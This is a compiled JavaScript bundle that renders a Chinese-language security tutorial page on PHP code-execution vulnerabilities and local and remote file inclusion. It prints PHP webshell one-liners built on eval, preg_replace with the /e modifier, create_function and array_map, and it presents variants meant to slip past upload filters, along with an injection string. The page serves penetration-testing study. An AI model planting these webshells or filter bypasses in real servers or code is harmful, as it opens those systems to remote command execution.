(window.webpackJsonp=window.webpackJsonp||[]).push([[26],{298:function(t,a,s){"use strict";s.r(a);var n=s(14),p=Object(n.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"代码执行漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#代码执行漏洞"}},[t._v("#")]),t._v(" 代码执行漏洞")]),t._v(" "),a("p",[t._v("代码执行漏洞原理：")]),t._v(" "),a("p",[t._v("用户输入的数据被当作后端代码执行")]),t._v(" "),a("p",[a("code",[t._v("<?php @eval($_REQUEST[8])?>")]),t._v(" 其实一句话木马的本质就是一个代码执行漏洞。用户输入的数据被当作代码进行执行。")]),t._v(" "),a("p",[t._v("RCE远程命令或者代码执行。现在因为RCE这个词滥用，RCE的范围比较广，只要渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以输入RCE")]),t._v(" "),a("p",[t._v("eval可以一次性执行多行代码")]),t._v(" "),a("p",[t._v("所以衍生出了一句话木马")]),t._v(" "),a("div",{staticClass:"language-PHP extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("preg_replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'/a/e'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'abc'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),a("p",[t._v("而一句话木马的出发精髓就被以PHP代码来解析，所以只要能让电脑认为他是PHP文件就可以成功触发。所以可以衍生出很多种PHP写法来绕过后端的PHP检测")]),t._v(" "),a("p",[t._v("例如：")]),t._v(" "),a("div",{staticClass:"language-php extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("preg_replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'/a/e'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'abc'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])])]),a("p",[t._v("这样的PHP代码少了<>。可以防止检测<>符号的后端检测到从而达到文件上传的目的。")]),t._v(" "),a("p",[t._v("正则表达式：")]),t._v(" "),a("p",[t._v("/a/i -> a是正则标识 i是修饰符(不区分大小写)")]),t._v(" "),a("p",[t._v("/a/e -> a是正则表达式，e是修饰符(要去替换的值可以用php的代码去执行)")]),t._v(" "),a("p",[t._v("一些一句话木马漏洞")]),t._v(" "),a("p",[t._v("多看看开发手则，说不定能找到开发不知道的漏洞")]),t._v(" "),a("div",{staticClass:"language-PHP extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("create_function")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'$id'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),a("blockquote",[a("p",[t._v("使用：}phpinfo();/")])]),t._v(" "),a("div",{staticClass:"language-PHP extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$b")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("array_map")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),a("p",[t._v("CMS安装的本质就是把原始的数据写入数据库")]),t._v(" "),a("h2",{attrs:{id:"本地包含与远程包含"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#本地包含与远程包含"}},[t._v("#")]),t._v(" 本地包含与远程包含")]),t._v(" "),a("ul",[a("li",[t._v("文件包含漏洞")])]),t._v(" "),a("p",[t._v("攻击者利用包含的特性，加上应用本身对文件(包含)控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件进行解析）。")]),t._v(" "),a("p",[t._v("一句话来说就是：文件包含并不属于漏洞，但是由于对包含进来的文件不可控，导致了文件包含漏洞的产生。")]),t._v(" "),a("br"),t._v(" "),a("blockquote",[a("p",[t._v("包含文件很有用，可以简化代码\n文件包含包括本地包含和远程文件包含（需要allow_url_include = On）\n本地文件包含LFI远程文件包含RFI")])]),t._v(" "),a("p",[t._v("相同代码重复出现在不同文件中出现代码冗余，所以出现了文件包含函数。就是为了让代码更加高效，需要用到的部分代码会去调用，且被包含的文件会被当作php代码执行，忽略后缀本身。")]),t._v(" "),a("ul",[a("li",[t._v("文件包含的函数")])]),t._v(" "),a("blockquote",[a("p",[a("code",[t._v("include")]),t._v("PHP运行到include然后去调用被包含的文件执行，如果包含文件不存在、报错也会继续向下执行。")])]),t._v(" "),a("br"),t._v(" "),a("blockquote",[a("p",[a("code",[t._v("require")]),t._v("PHP在运行之前，就先去把被包含的文件的内容进行提取出来然后整合成一个新的PHP一起执行。如果包含的文件不存在，报错，就不会往下执行了")])]),t._v(" "),a("p",[t._v("在代码审计一个代码的时候，可以使用代码审计软件进行快速审计关键词")]),t._v(" "),a("p",[t._v("当然在时间充足的情况下通读全文是最好的选择。")])])}),[],!1,null,null,null);a.default=p.exports}}]);